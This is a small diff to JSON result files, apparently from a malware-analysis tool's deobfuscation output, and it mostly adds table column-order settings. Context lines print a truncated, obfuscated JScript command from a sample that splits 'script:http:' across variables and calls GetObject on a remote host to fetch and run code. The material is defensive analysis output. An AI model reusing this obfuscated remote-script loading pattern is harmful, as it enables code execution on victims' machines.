@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": "{\"Number of line after deobfuscation\": 6}",
+        "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 0,
@@ -24,6 +25,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"Filename\": \"C:\\\\BT59TX5\\\\BT59TX5.jS\", \"Command [trun.]\": \"/p K1J0=\\\"var C66d=\\\"sc\\\"+\\\"r\\\" D66d=\\\"ip\\\"+\\\"t:h\\\" E66d=\\\"T\\\"+\\\"tP\\\"+\\\":\\\" GetObject(C66d+D66d+E66d+'//n7eo5j.real\"}]",
+        "body_config": {
+          "column_order": [
+            "Filename",
+            "Command [trun.]"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -42,6 +49,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"Filename\": \"c:\\\\bt59tx5\\\\bt59tx5.js\", \"Command\": \"c:\\\\bt59tx5\\\\bt59tx5.js\"}]",
+        "body_config": {
+          "column_order": [
+            "Filename",
+            "Command"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
